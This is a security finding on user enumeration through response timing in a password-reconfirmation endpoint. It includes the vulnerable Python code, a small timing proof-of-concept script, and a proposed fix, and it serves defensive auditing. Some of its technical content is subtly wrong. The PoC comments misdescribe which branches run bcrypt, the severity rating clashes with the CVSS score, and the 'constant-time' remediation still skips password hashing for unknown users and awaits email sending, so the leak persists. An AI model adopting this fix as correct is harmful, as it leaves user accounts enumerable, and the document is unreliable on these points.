# SEC_001_A07_AUTH.md — User Enumeration via Timing Difference in /reenviar-confirmacao

## Metadata

| Campo | Valor |
|---|---|
| Severity | CRITICAL |
| OWASP Category | A07:2021 – Authentication Failures |
| File | `backend/endpoints/auth_endpoints.py` |
| Lines | 350–372 |
| CVSS 3.1 | 7.5 (High) — AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N |

## Vulnerabilidade

O endpoint `/api/auth/reenviar-confirmacao` retorna sempre a mesma mensagem genérica `"Se a conta existir e ainda precisar de confirmacao, voce recebera um novo email."`, aparentemente blindado contra enumeration. Porem a logica interna diverge em tempo de execucao dependendo de qual condicao falha:

```python
# auth_endpoints.py, linhas 358–365
if (
    not user                        # usuario NAO existe
    or not user[3]                   # password_hash NULL
    or not verify_password(data.password, user[3])
    or (user[4] or "").lower() in BLOCKED_USER_STATUSES
    or user[2]                       # email JA confirmado
):
    return {"status": "ok", "mensagem": GENERIC_CONFIRMATION_MESSAGE}
# So aqui embaixo é que entra se todas as condicoes acima forem FALSE
# -> usuario existe, hash existe, senha correta, nao bloqueado, email NAO confirmado
await enviar_email_confirmacao(data.email, user[1] or data.email, confirm_token)
return {"status": "ok", "mensagem": GENERIC_CONFIRMATION_MESSAGE}
```

**Ataque:** Um atacante faz login com credenciais invalidas (usuario inexistente ou senha errada) versus login com credenciais validas mas de conta nao confirmada. As duas branches executam um numero diferente de operacoes:
- Usuario inexistente: `verify_password` NAO e chamada (curto)
- Usuario existe + senha errada: `verify_password` é chamada (bcrypt, ~300ms)
- Usuario existe + senha correta + nao confirmado: vai ate `enviar_email_confirmacao` (rede + possivelmente longo)
- Usuario existe + senha correta + ja confirmado: retorna imediatamente apos verificacoes

Um atacante pode identificar se um email esta cadastrado e em que estado (bloqueado/nao confirmado/ja ativo) medindo o tempo de resposta. Isso viola o requisito CWE-204: Observable Response Discrepancy.

## Impacto

- **Enumeração de usuarios**: Atacante descobre quais emails estao registrados na plataforma
- **Mapeamento de base de usuarios**: Permite construir lista de alvos para ataques direcionados
- **Identificacao de contas ativas vs inativas**: Auxilia na triagem de contas para ataques de Credential Stuffing
- **Conformidade LGPD/PCI-DSS**: Tratamento diferenciado de respostas revela informacao sobre dados de terceiros

## Exploit

```python
import time
import requests

TARGET_EMAIL = "alvo@exemplo.com"
VALID_PASSWORD = "senha_invalida_quality123"  # propositalmente errada

def measure_response_time(email, password):
    start = time.time()
    r = requests.post("/api/auth/reenviar-confirmacao", json={
        "email": email, "password": password
    })
    elapsed = time.time() - start
    return elapsed, r.elapsed.total_seconds()

# Usuario nao existe -> rapido (< 50ms rede)
t1 = measure_response_time("naoexiste@x.com", VALID_PASSWORD)

# Usuario existe, bloqueado/ja ativo -> rapido (verificacoes locais)
t2 = measure_response_time("bloqueado@x.com", VALID_PASSWORD)

# Usuario existe, nao confirmado, senha errada -> bcrypt (~200-400ms)
t3 = measure_response_time("alvo@exemplo.com", VALID_PASSWORD)

# Perfis de tempo diferentes = informacao vazada
```

## Remediation

Sempre executar o mesmo caminho de codigo, incluindo operacoes de tempo constante, para TODOS os casos de falha:

```python
@router.post("/reenviar-confirmacao")
async def reenviar_confirmacao(request: Request, data: LoginRequest, db: Session = Depends(get_db)):
    from services.email_service import enviar_email_confirmacao
    import secrets, time
    from backend.utils.password_utils import verify_password

    user = db.execute(
        text("SELECT id, nome, email_confirmado, password_hash, status FROM users WHERE email = :email"),
        {"email": data.email},
    ).fetchone()

    # Sempre executar verificacao de senha (tempo constante)
    password_valid = False
    if user and user[3]:
        try:
            password_valid = verify_password(data.password, user[3])
        except Exception:
            password_valid = False

    # Logica de envio soh determina SE ENVIAR, mas tempo de resposta deve ser uniforme
    should_send = (
        user is not None
        and user[3] is not None          # tem hash
        and password_valid                # senha correta
        and (user[4] or "").lower() not in BLOCKED_USER_STATUSES
        and not user[2]                  # email NAO confirmado
    )

    if should_send:
        confirm_token = secrets.token_urlsafe(32)
        confirm_expires = (datetime.utcnow() + timedelta(hours=24)).isoformat()
        db.execute(text(
            "UPDATE users SET confirm_token=:token, confirm_expires=:expires WHERE id=:id"
        ), {"token": confirm_token, "expires": confirm_expires, "id": user[0]})
        db.commit()
        try:
            await enviar_email_confirmacao(data.email, user[1] or data.email, confirm_token)
        except Exception:
            pass

    # SEMPRE retornar imediatamente com a mesma mensagem, semifer
    # Adicionar jitter para evitar inferencia por tempo
    import random, asyncio
    await asyncio.sleep(random.uniform(0.05, 0.15))

    return {"status": "ok", "mensagem": GENERIC_CONFIRMATION_MESSAGE}
```

## Referencia

- CWE-204: Observable Response Discrepancy
- OWASP A07:2021 – Authentication Failures
- OWASP Authentication Cheat Sheet — Generic Error Messages
